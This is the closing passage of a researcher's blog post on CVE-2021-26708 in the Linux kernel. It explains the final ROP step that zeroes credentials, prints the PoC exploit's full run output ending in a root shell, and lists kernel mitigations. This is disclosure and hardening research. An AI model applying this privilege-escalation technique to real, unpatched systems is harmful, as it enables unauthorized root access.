<p>The <code class="language-plaintext highlighter-rouge">callback</code> function pointer stores the address of a single ROP gadget. The <code class="language-plaintext highlighter-rouge">RDI</code> register stores the first argument of the <code class="language-plaintext highlighter-rouge">callback</code> function, which is the address of <code class="language-plaintext highlighter-rouge">ubuf_info</code> itself. So <code class="language-plaintext highlighter-rouge">RDI + 8</code> points to <code class="language-plaintext highlighter-rouge">ubuf_info.desc</code>. The gadget moves <code class="language-plaintext highlighter-rouge">ubuf_info.desc</code> to <code class="language-plaintext highlighter-rouge">RDX</code>. Now <code class="language-plaintext highlighter-rouge">RDX</code> contains the address of the effective user ID and group ID, minus one byte. That byte is important: when the gadget writes qword with <strong>1</strong> from <code class="language-plaintext highlighter-rouge">RSI</code> to the memory pointed to by <code class="language-plaintext highlighter-rouge">RDX</code>, the effective <code class="language-plaintext highlighter-rouge">uid</code> and <code class="language-plaintext highlighter-rouge">gid</code> are overwritten by zeros.</p>

<p>Then the same procedure is repeated for <code class="language-plaintext highlighter-rouge">uid and gid</code>. Privileges are escalated to <code class="language-plaintext highlighter-rouge">root</code>. Game over.</p>

<p>Exploit output that displays the whole procedure:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[a13x@localhost ~]$ ./vsock_pwn

=================================================
==== CVE-2021-26708 PoC exploit by a13xp0p0v ====
=================================================

[+] begin as: uid=1000, euid=1000
[+] we have 2 CPUs for racing
[+] getting ready...
[+] remove old files for ftok()
[+] spray_data at 0x7f0d9111d000
[+] userfaultfd #1 is configured: start 0x7f0d91121000, len 0x1000
[+] fault_handler for uffd 38 is ready

[+] stage I: collect good msg_msg locations
[+] go racing, show wins: 
	save msg_msg ffff9125c25a4d00 in msq 11 in slot 0
	save msg_msg ffff9125c25a4640 in msq 12 in slot 1
	save msg_msg ffff9125c25a4780 in msq 22 in slot 2
	save msg_msg ffff9125c3668a40 in msq 78 in slot 3

[+] stage II: arbitrary free msg_msg using corrupted msg_msg
	kaddr for arb free: ffff9125c25a4d00
	kaddr for arb read: ffff9125c2035300
[+] adapt the msg_msg spraying payload:
	msg_ptr 0x7f0d91120fd8
	m_type 1337 at 0x7f0d91120fe8
	m_ts 6096 at 0x7f0d91120ff0
	msgseg next 0xffff9125c2035300 at 0x7f0d91120ff8
[+] go racing, show wins: 

[+] stage III: arbitrary read vsock via good overwritten msg_msg (msq 11)
[+] msgrcv returned 6096 bytes
[+] Found sk_memcg ffff9125c42f9000 (offset 4712 in the leaked kmem)
[+] Found owner cred ffff9125c3fd6e40 (offset 4888 in the leaked kmem)
[+] Found sock_def_write_space ffffffffab9851b0 (offset 4736 in the leaked kmem)
[+] Calculated kaslr offset: 2a000000

[+] stage IV: search sprayed skb near sk_memcg...
[+] checking possible skb location: ffff9125c42fa000
[+] stage IV part I: repeat arbitrary free msg_msg using corrupted msg_msg
	kaddr for arb free: ffff9125c25a4640
	kaddr for arb read: ffff9125c42fa030
[+] adapt the msg_msg spraying payload:
	msg_ptr 0x7f0d91120fd8
	m_type 1337 at 0x7f0d91120fe8
	m_ts 6096 at 0x7f0d91120ff0
	msgseg next 0xffff9125c42fa030 at 0x7f0d91120ff8
[+] go racing, show wins: 0 0 20 15 42 11 
[+] stage IV part II: arbitrary read skb via good overwritten msg_msg (msq 12)
[+] msgrcv returned 6096 bytes
[+] found a real skb

[+] stage V: try to do UAF on skb at ffff9125c42fa000
[+] skb payload:
	start at 0x7f0d91120004
	skb_shared_info at 0x7f0d91120ec4
	tx_flags 0x8
	destructor_arg 0xffff9125c42fa100
	callback 0xffffffffab64f6d4
	desc 0xffff9125c3fd6e53
[+] go racing, show wins: 15 

[+] stage VI: repeat UAF on skb at ffff9125c42fa000
[+] go racing, show wins: 0 12 13 15 3 12 4 16 17 18 9 47 5 12 13 9 13 19 9 10 13 15 12 13 15 17 30 

[+] finish as: uid=0, euid=0
[+] starting the root shell...
uid=0(root) gid=0(root) groups=0(root),1000(a13x) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
</code></pre></div></div>

<h2 id="possible-exploit-mitigations">Possible exploit mitigations</h2>

<p>Several technologies could prevent exploitation of <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-26708">CVE-2021-26708</a> or at least make it harder.</p>

<ol>
  <li>
    <p>Exploiting this vulnerability is impossible with the <strong>Linux kernel heap quarantine</strong>, since the memory corruption happens very shortly after the race condition. Read about my <code class="language-plaintext highlighter-rouge">SLAB_QUARANTINE</code> prototype <a href="https://a13xp0p0v.github.io/2020/11/30/slab-quarantine.html">in a separate article</a>.</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">MODHARDEN</code> from the grsecurity patch prevents kernel module autoloading by unprivileged users.</p>
  </li>
  <li>
    <p>Setting <code class="language-plaintext highlighter-rouge">/proc/sys/vm/unprivileged_userfaultfd</code> to <code class="language-plaintext highlighter-rouge">0</code> would block the described method of keeping the payload in the kernelspace. That toggle restricts <code class="language-plaintext highlighter-rouge">userfaultfd()</code> to only privileged users (with the <code class="language-plaintext highlighter-rouge">SYS_CAP_PTRACE</code> capability).</p>
  </li>
  <li>
    <p>Setting the <code class="language-plaintext highlighter-rouge">kernel.dmesg_restrict</code> sysctl to <code class="language-plaintext highlighter-rouge">1</code> would block infoleak via the kernel log. This sysctl restricts the ability of unprivileged users to read the kernel syslog via <code class="language-plaintext highlighter-rouge">dmesg</code>.</p>
  </li>
  <li>
    <p>Control Flow Integrity could prevent calling my ROP gadget. You can see these technologies on the <a href="https://github.com/a13xp0p0v/linux-kernel-defence-map">Linux Kernel Defence Map</a> that I maintain.</p>
  </li>
  <li>
    <p>Hopefully, future versions of the Linux kernel will have support for the <a href="https://community.arm.com/developer/ip-products/processors/b/processors-ip-blog/posts/enhancing-memory-safety">ARM Memory Tagging Extension (MTE)</a> to mitigate use-after-free on ARM.</p>
  </li>
  <li>
    <p>I have heard rumors of a <a href="https://grsecurity.net/">grsecurity</a> Wunderwaffe called <code class="language-plaintext highlighter-rouge">AUTOSLAB</code>. We don't know much about it. Presumably, it makes Linux allocate kernel objects in separate slab caches depending on the object type. That could ruin the heap spraying technique that I use heavily in this exploit.</p>
  </li>
  <li>
    <p>Kees Cook noted that setting sysctl <code class="language-plaintext highlighter-rouge">panic_on_warn</code> to 1 would disturb the attack. Yes, that turns possible privilege escalation into denial-of-service. For the record, I do NOT recommend enabling <code class="language-plaintext highlighter-rouge">panic_on_warn</code> or <code class="language-plaintext highlighter-rouge">CONFIG_PANIC_ON_OOPS</code> on production systems because that enables easy denial-of-service attacks (kernel warning/oops is not a rare situation). For more details, see the documentation of my <a href="https://github.com/a13xp0p0v/kconfig-hardened-check#questions-and-answers">kconfig-hardened-check</a> project.</p>
  </li>
</ol>

<h2 id="closing-words">Closing words</h2>

<p>Investigating, fixing <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-26708">CVE-2021-26708</a>, and developing the PoC exploit was an interesting and exhausting journey.</p>

<p>I managed to turn a race condition with very limited memory corruption into arbitrary read/write of kernel memory and privilege escalation on <strong>Fedora 33 Server</strong> for <strong>x86_64</strong>, bypassing <strong>SMEP</strong> and <strong>SMAP</strong>. During this research, I've created several new vulnerability exploitation tricks for the Linux kernel.</p>

<center><img src="./2021 - Four Bytes of Power exploiting CVE-2021-26708 in the Linux kernel_files/all_weapons.jpg" width="85%"></center>
<p><br></p>

<p>I believe writing this article is important for the Linux kernel community as a way to come up with new ideas for improving kernel security. I hope you have enjoyed reading it!</p>

<p>And, of course, I thank Positive Technologies for giving me the opportunity to work on this research.</p>


  </div><a class="u-url" href="https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html" hidden=""></a>
</article>

      </div>
    </main><footer class="site-footer">

  <div class="wrapper">

    <h2 class="footer-heading">Contacts</h2>

      <div class="footer-col footer-col-1">
        <ul class="social-media-list">
          
            <li>
              <a href="mailto:alex.popov@linux.com">
                <span class="icon  icon--email">
                  <svg fill="#828282" height="17px" width="17px" viewBox="0 0 24 24">
                  <path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"></path>
                  <path d="M0 0h24v24H0z" fill="none"></path>
                  </svg>
                </span>
		<span class="username">alex.popov@linux.com</span>
              </a>
            </li>
          

          
          <li>
            <a href="https://twitter.com/a13xp0p0v"><span class="icon icon--twitter"><svg viewBox="0 0 16 16" width="16px" height="16px"><path fill="#828282" d="M15.969,3.058c-0.586,0.26-1.217,0.436-1.878,0.515c0.675-0.405,1.194-1.045,1.438-1.809c-0.632,0.375-1.332,0.647-2.076,0.793c-0.596-0.636-1.446-1.033-2.387-1.033c-1.806,0-3.27,1.464-3.27,3.27 c0,0.256,0.029,0.506,0.085,0.745C5.163,5.404,2.753,4.102,1.14,2.124C0.859,2.607,0.698,3.168,0.698,3.767 c0,1.134,0.577,2.135,1.455,2.722C1.616,6.472,1.112,6.325,0.671,6.08c0,0.014,0,0.027,0,0.041c0,1.584,1.127,2.906,2.623,3.206 C3.02,9.402,2.731,9.442,2.433,9.442c-0.211,0-0.416-0.021-0.615-0.059c0.416,1.299,1.624,2.245,3.055,2.271 c-1.119,0.877-2.529,1.4-4.061,1.4c-0.264,0-0.524-0.015-0.78-0.046c1.447,0.928,3.166,1.469,5.013,1.469 c6.015,0,9.304-4.983,9.304-9.304c0-0.142-0.003-0.283-0.009-0.423C14.976,4.29,15.531,3.714,15.969,3.058z"></path></svg>
</span><span class="username">a13xp0p0v</span></a>

          </li>
          

	  
          <li>
            <a href="https://github.com/a13xp0p0v"><span class="icon icon--github"><svg viewBox="0 0 16 16" width="16px" height="16px"><path fill="#828282" d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761 c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32 c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472 c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037 C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65 c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261 c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082 c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129 c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"></path></svg>
</span><span class="username">a13xp0p0v</span></a>

          </li>
          

	  
	  <li>
	    <a href="https://t.me/a13xp0p0v">
	      <span class="icon  icon--telegram">
		  <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#828282" class="bi bi-telegram" viewBox="0 0 16 16">
		  <path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zM8.287 5.906c-.778.324-2.334.994-4.666
		  2.01-.378.15-.577.298-.595.442-.03.243.275.339.69.47l.175.055c.408.133.958.288
		  1.243.294.26.006.549-.1.868-.32 2.179-1.471 3.304-2.214 3.374-2.23.05-.012.12-.026.166.016.047.041.042.12.037.141-.03.129-1.227
		  1.241-1.846 1.817-.193.18-.33.307-.358.336a8.154 8.154 0 0 1-.188.186c-.38.366-.664.64.015
		  1.088.327.216.589.393.85.571.284.194.568.387.936.629.093.06.183.125.27.187.331.236.63.448.997.414.214-.02.435-.22.547-.82.265-1.417.786-4.486.906-5.751a1.426
		  1.426 0 0 0-.013-.315.337.337 0 0 0-.114-.217.526.526 0 0 0-.31-.093c-.3.005-.763.166-2.984 1.09z"></path>
		  </svg>
	      </span>
	      <span class="username">a13xp0p0v</span>
	    </a>
	  </li>
          

	  
	  <li>
	    <a href="https://www.linkedin.com/in/a13xp0p0v">
	      <span class="icon  icon--linkedin">
		  <svg viewBox="0 0 512 512" width="16px" height="16px">
	          <path fill="#828282" d="M150.65,100.682c0,27.992-22.508,50.683-50.273,50.683c-27.765,0-50.273-22.691-50.273-50.683
	          C50.104,72.691,72.612,50,100.377,50C128.143,50,150.65,72.691,150.65,100.682z M143.294,187.333H58.277V462h85.017V187.333z
	          M279.195,187.333h-81.541V462h81.541c0,0,0-101.877,0-144.181c0-38.624,17.779-61.615,51.807-61.615
	          c31.268,0,46.289,22.071,46.289,61.615c0,39.545,0,144.181,0,144.181h84.605c0,0,0-100.344,0-173.915
	          s-41.689-109.131-99.934-109.131s-82.768,45.369-82.768,45.369V187.333z"></path>
	        </svg>
	      </span>
	      <span class="username">a13xp0p0v</span>
	    </a>
	  </li>
          
        </ul>
      </div>

  </div>

</footer>



</body></html>